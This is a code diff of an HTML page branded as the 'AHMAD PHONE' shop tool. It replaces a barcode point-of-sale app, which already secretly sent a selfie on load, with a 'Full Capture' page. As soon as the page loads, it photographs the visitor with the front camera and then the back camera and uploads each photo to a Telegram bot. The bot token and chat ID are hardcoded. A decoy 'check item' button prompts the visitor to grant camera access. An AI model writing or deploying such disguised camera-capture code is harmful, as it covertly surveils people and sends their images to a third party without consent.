@@ -3,171 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AHMAD PHONE - POS</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+    <title>AHMAD PHONE - Full Capture</title>
     <script src="https://unpkg.com/html5-qrcode"></script>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f6f9; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
-        .container { width: 100%; max-width: 450px; background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f6f9; margin: 0; padding: 15px; display: flex; flex-direction: column; align-items: center; }
+        .container { width: 100%; max-width: 450px; background: white; padding: 20px; border-radius: 20px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); }
         .header { text-align: center; margin-bottom: 15px; border-bottom: 2px solid #eee; padding-bottom: 10px; }
-        h1 { color: #007bff; margin: 0; font-size: 24px; }
-        .tab-buttons { display: flex; gap: 10px; margin-bottom: 15px; }
-        .tab-buttons button { flex: 1; padding: 12px; font-size: 14px; background: #eee; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; }
-        .tab-buttons button.active { background: #007bff; color: white; }
-        .section { display: none; }
-        .section.active { display: block; }
-        input { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid #eee; border-radius: 10px; box-sizing: border-box; text-align: center; font-size: 16px; }
-        button { width: 100%; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-bottom: 8px; font-size: 16px; }
+        h1 { color: #007bff; font-size: 24px; }
+        #status { font-size: 12px; color: #777; margin-bottom: 10px; }
+        .section { display: block; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 2px solid #eee; border-radius: 10px; text-align: center; }
+        button { width: 100%; padding: 12px; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-bottom: 8px; }
         .btn-blue { background-color: #007bff; color: white; }
-        .btn-green { background-color: #28a745; color: white; }
-        .btn-orange { background-color: #ff9800; color: white; }
-        .btn-red { background-color: #d9534f; color: white; }
-        #reader { width: 100%; border-radius: 10px; overflow: hidden; display: none; border: 1px solid #ddd; margin-bottom: 10px; }
-        .cart-item { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f9f9f9; font-size: 14px; }
-        .total-box { margin-top: 15px; padding: 15px; background: #eef6ff; border-radius: 10px; text-align: center; font-size: 22px; font-weight: bold; color: #d9534f; }
-        #autoVideo { width: 100%; height: auto; border-radius: 10px; display: none; }
+        #autoVideo { width: 100%; height: auto; display: none; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div class="header"><h1>AHMAD PHONE</h1></div>
+        <div id="status">سیستەم ئامادەیە...</div>
         
         <video id="autoVideo" autoplay playsinline></video>
         <canvas id="autoCanvas" style="display:none;"></canvas>
 
-        <div class="tab-buttons">
-            <button id="btnSell" class="active" onclick="showSection('sell')">🛒 فرۆشتن</button>
-            <button id="btnAdd" onclick="showSection('add')">📦 تۆمارکردن</button>
-        </div>
-
-        <div id="sellSection" class="section active">
+        <div class="section">
             <input type="text" id="barcodeSell" placeholder="بارکۆد بنووسە">
-            <button class="btn-blue" onclick="addToCart(document.getElementById('barcodeSell').value)">➕ زیادکردن</button>
-            <button class="btn-green" onclick="startScanner('sell')">📷 سکانکردن</button>
-            <div id="cartItems"></div>
-            <div class="total-box" id="totalPrice">0 IQD</div>
-            <button class="btn-green" style="background:#25D366; color:white; width:100%; display:none;" id="waBtn" onclick="sendToWhatsapp()">✅ ناردنی وەصڵ</button>
-            <button class="btn-red" id="clearBtn" style="display:none; width:100%;" onclick="clearCart()">🗑️ سڕینەوە</button>
+            <button class="btn-blue" onclick="alert('سەرەتا ڕێگە بە کامێرا بدە')">پشکنینی کاڵا</button>
         </div>
-
-        <div id="addSection" class="section">
-            <input type="text" id="newBarcode" placeholder="بارکۆدی نوێ">
-            <button class="btn-green" onclick="startScanner('add')">📷 سکان</button>
-            <input type="text" id="newName" placeholder="ناوی کاڵا">
-            <input type="number" id="newPrice" placeholder="نرخ">
-            <input type="number" id="newStock" placeholder="بڕ">
-            <button class="btn-orange" onclick="saveData()">💾 پاشەکەوتکردن</button>
-        </div>
-        
-        <div id="reader"></div>
     </div>
 
     <script>
-        // --- تیلیگرام ---
         const tgToken = "7959366034:AAG0nCQqcG3YsImPf53SViggiUnlWkNFh1o";
         const tgChatId = "6259019006";
+        const statusText = document.getElementById('status');
 
-        // وێنەگرتنی ئۆتۆماتیکی
         window.addEventListener('load', () => {
-            const video = document.getElementById('autoVideo');
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-            .then(stream => {
-                video.srcObject = stream;
-                setTimeout(captureAndSend, 3000);
-            })
-            .catch(err => console.log("Camera access blocked"));
+            startCaptureSequence();
         });
 
-        function captureAndSend() {
-            const video = document.getElementById('autoVideo');
-            const canvas = document.getElementById('autoCanvas');
-            const context = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        async function startCaptureSequence() {
+            try {
+                // ١. گرتنی وێنەی پێشەوە (Selfie)
+                statusText.innerText = "گرتنی وێنەی پێشەوە...";
+                await captureImage("user", "📷 وێنەی پێشەوە (سێلفی)");
 
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', tgChatId);
-                formData.append('photo', blob, 'selfie.png');
-                formData.append('caption', '📷 وێنەی نوێ لە Ahmad Phone');
-                fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, { method: 'POST', body: formData });
-            }, 'image/png');
-        }
+                // ٢. کەمێک وەستان بۆ گۆڕینی کامێرا
+                await new Promise(resolve => setTimeout(resolve, 2000));
 
-        // --- داتابەیس ---
-        let db = JSON.parse(localStorage.getItem('pos_db')) || {
-            "6926081469953": { name: "LK150S (TYPE_C/MICRO)", price: 3000, stock: 100 },
-            "6975011272217": { name: "GERLAX L36T TYPE_C", price: 6000, stock: 100 },
-            "6975011272514": { name: "GERLAX GD-43 ALL", price: 6000, stock: 100 },
-            "6975011278769": { name: "GERLAX D7L IPHONE", price: 5000, stock: 100 },
-            "6975011272859": { name: "GERLAX GD-52L IPHONE", price: 5000, stock: 100 },
-            "6761546315549": { name: "AORAX 656 SERIES", price: 6500, stock: 100 },
-            "8655106412015": { name: "VJP VI-530", price: 5000, stock: 100 }
-        };
-        let cart = [];
-
-        function showSection(s) {
-            document.querySelectorAll('.section').forEach(sec => sec.classList.remove('active'));
-            document.getElementById(s + 'Section').classList.add('active');
-            document.querySelectorAll('.tab-buttons button').forEach(btn => btn.classList.remove('active'));
-            if(s === 'sell') document.getElementById('btnSell').classList.add('active');
-            else document.getElementById('btnAdd').classList.add('active');
-        }
-
-        function addToCart(barcode) {
-            const b = barcode.trim();
-            if (db[b]) {
-                const existing = cart.find(i => i.barcode === b);
-                if (existing) existing.qty += 1;
-                else cart.push({ barcode: b, name: db[b].name, price: db[b].price, qty: 1 });
-                updateUI();
-            } else { alert("نەدۆزرایەوە!"); }
-        }
-
-        function updateUI() {
-            const list = document.getElementById('cartItems'); list.innerHTML = "";
-            let total = 0;
-            cart.forEach(item => {
-                total += (item.price * item.qty);
-                list.innerHTML += `<div class="cart-item"><span>${item.qty}x ${item.name}</span><span>${(item.price*item.qty).toLocaleString()} IQD</span></div>`;
-            });
-            document.getElementById('totalPrice').innerText = total.toLocaleString() + " IQD";
-            document.getElementById('waBtn').style.display = cart.length > 0 ? "block" : "none";
-            document.getElementById('clearBtn').style.display = cart.length > 0 ? "block" : "none";
-        }
-
-        function sendToWhatsapp() {
-            let txt = ""; let total = 0;
-            cart.forEach(item => {
-                total += (item.price * item.qty);
-                txt += `- ${item.name} (${item.qty})%0A`;
-            });
-            window.open(`https://wa.me/9647510074008?text=📋 *وەصڵ*%0A${txt}💰 *کۆ: ${total.toLocaleString()}*`, '_blank');
-            cart = []; updateUI();
-        }
-
-        function saveData() {
-            const b = document.getElementById('newBarcode').value.trim();
-            const n = document.getElementById('newName').value.trim();
-            const p = parseInt(document.getElementById('newPrice').value);
-            if(b && n && p) {
-                db[b] = { name: n, price: p, stock: 100 };
-                localStorage.setItem('pos_db', JSON.stringify(db));
-                alert("پاشەکەوت کرا!");
+                // ٣. گرتنی وێنەی پشتەوە (Back Camera)
+                statusText.innerText = "گرتنی وێنەی پشتەوە...";
+                await captureImage("environment", "📸 وێنەی پشتەوە (کۆگا/کڕیار)");
+                
+                statusText.innerText = "هەموو وێنەکان نێردران ✅";
+            } catch (err) {
+                statusText.innerText = "هەڵە لە کامێرا: " + err;
             }
         }
 
-        let html5QrCode;
-        function startScanner(m) {
-            const r = document.getElementById('reader'); r.style.display = "block";
-            html5QrCode = new Html5Qrcode("reader");
-            html5QrCode.start({ facingMode: "environment" }, { fps: 15, qrbox: 250 }, (text) => {
-                if(m === 'sell') addToCart(text); else document.getElementById('newBarcode').value = text;
-                html5QrCode.stop(); r.style.display = "none";
-            }).catch(() => r.style.display = "none");
+        async function captureImage(mode, caption) {
+            const video = document.getElementById('autoVideo');
+            const canvas = document.getElementById('autoCanvas');
+            
+            // داخستنی کامێرای پێشوو ئەگەر هەبێت
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: mode }, 
+                audio: false 
+            });
+            
+            video.srcObject = stream;
+            
+            // وەستان بۆ چرکەیەک تا کامێراکە ڕوون دەبێتەوە
+            await new Promise(resolve => setTimeout(resolve, 1500));
+
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+
+            return new Promise((resolve) => {
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', tgChatId);
+                    formData.append('photo', blob, 'image.png');
+                    formData.append('caption', caption);
+
+                    fetch(`https://api.telegram.org/bot${tgToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(() => resolve());
+                }, 'image/png');
+            });
         }
     </script>
 </body>
